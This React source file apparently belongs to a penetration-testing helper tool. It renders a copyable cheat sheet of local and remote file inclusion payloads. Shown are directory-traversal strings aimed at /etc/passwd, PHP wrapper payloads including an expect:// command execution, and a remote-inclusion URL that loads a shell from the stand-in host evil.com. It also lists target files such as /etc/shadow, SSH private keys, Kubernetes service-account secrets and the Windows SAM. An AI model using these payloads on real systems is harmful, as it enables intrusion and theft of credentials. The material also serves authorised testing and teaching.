import React from 'react';
import { Button, message, Typography, Divider } from 'antd';
import { CopyOutlined, LinkOutlined } from '@ant-design/icons';
import QueueAnim from 'rc-queue-anim';
import Clipboard from 'react-clipboard.js';

const { Title, Paragraph, Text } = Typography;

export default function LFI () {
    const successInfoReverseShell = () => {
        message.success( 'Your payload has been copied successfully !' );
    };

    const successInfoEncodeURL = () => {
        message.success( 'Your payload URL encoded has been copied successfully !' );
    };

    const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
    const phpWrapperLfi = `/example1.php?page=expect://ls`;
    const phpWrapperFilter = `/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
    const phpRfi = `http://example.com/index.php?page=http://evil.com/shell.txt`;
    const linux = [
        { title: '/etc/passwd' },
        { title: '/etc/shadow' },
        { title: '/etc/issue' },
        { title: '/etc/group' },
        { title: '/etc/hostname' },
        { title: '/etc/ssh/ssh_config' },
        { title: '/etc/ssh/sshd_config' },
        { title: '/root/.ssh/id_rsa' },
        { title: '/root/.ssh/authorized_keys' },
        { title: '/home/user/.ssh/authorized_keys' },
        { title: '/home/user/.ssh/id_rsa' },
        { title: '/proc/[0-9]*/fd/[0-9]*' },
        { title: '/proc/mounts' },
        { title: '/home/$USER/.bash_history' },
        { title: '/home/$USER/.ssh/id_rsa' },
        { title: '/var/run/secrets/kubernetes.io/serviceaccount' },
        { title: '/var/lib/mlocate/mlocate.db' },
        { title: '/var/lib/mlocate.db' }
    ];
    const apache = [
        { title: '/etc/apache2/apache2.conf' },
        { title: '/usr/local/etc/apache2/httpd.conf' },
        { title: '/etc/httpd/conf/httpd.conf' },
        { title: 'Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log' },
        { title: 'Debian/Ubuntu -> /var/log/apache2/access.log' },
        { title: 'FreeBSD -> /var/log/httpd-access.log' },
        { title: '/var/log/apache/access.log' },
        { title: '/var/log/apache/error.log' },
        { title: '/var/log/apache2/access.log' },
        { title: '/var/log/apache/error.log' }
    ];
    const mysql = [
        { title: '/var/lib/mysql/mysql/user.frm' },
        { title: '/var/lib/mysql/mysql/user.MYD' },
        { title: '/var/lib/mysql/mysql/user.MYI' }
    ];
    const windows = [
        { title: '/boot.ini' },
        { title: '/autoexec.bat' },
        { title: '/windows/system32/drivers/etc/hosts' },
        { title: '/windows/repair/SAM' },
        { title: '/windows/panther/unattended.xml' },
        { title: '/windows/panther/unattend/unattended.xml' },
        { title: '/windows/system32/license.rtf' },
        { title: '/windows/system32/eula.txt' }
    ];

    return (
        <QueueAnim delay={300} duration={1500}>
            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                LFI
            </Title>
            <Paragraph style={{ margin: 15 }}>
                LFI stands for Local File Includes - it’s a file local inclusion vulnerability that allows an attacker
                to include files that exist on the target web server.
            </Paragraph>
            <Paragraph style={{ marginLeft: 15 }}>
                Typically this is exploited by abusing dynamic file inclusion mechanisms that don’t sanitize user input.
            </Paragraph>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Title level={3}>Directory traversal</Title>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{directoryTraversal}</Text></pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={directoryTraversal}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined /> Copy the payload
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( directoryTraversal )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider dashed />
            <div
                key='b'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>PHP Wrapper php://file</Title>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{phpWrapperLfi}</Text></pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={phpWrapperLfi}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined />
                        Copy the payload
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( phpWrapperLfi )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider dashed />
            <div
                key='c'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>PHP Wrapper php://filter</Title>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{phpWrapperFilter}</Text></pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={phpWrapperFilter}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined />
                        Copy the payload
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( phpWrapperFilter )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider dashed />
            <div
                key='d'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>PHP Wrapper php://filter</Title>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{phpRfi}</Text></pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={phpRfi}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined />
                        Copy the payload
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( phpRfi )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider dashed />
            <div
                key='e'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Useful LFI files</Title>
                <Title level={4}>Linux</Title>
                {linux.map( ( k, i ) => {
                    return (
                        <Paragraph key={i}>
                            <pre><Text copyable>{k.title}</Text></pre>
                        </Paragraph>
                    );
                } )}
                <Divider dashed />
                <Title level={4}>Apache</Title>
                {apache.map( ( k, i ) => {
                    return (
                        <Paragraph key={i}>
                            <pre><Text copyable>{k.title}</Text></pre>
                        </Paragraph>
                    );
                } )}
                <Divider dashed />
                <Title level={4}>MySQL</Title>
                {mysql.map( ( k, i ) => {
                    return (
                        <Paragraph key={i}>
                            <pre><Text copyable>{k.title}</Text></pre>
                        </Paragraph>
                    );
                } )}
                <Divider dashed />
                <Title level={4}>Windows</Title>
                {windows.map( ( k, i ) => {
                    return (
                        <Paragraph key={i}>
                            <pre><Text copyable>{k.title}</Text></pre>
                        </Paragraph>
                    );
                } )}
            </div>
            <Divider dashed />
        </QueueAnim>
    );
};
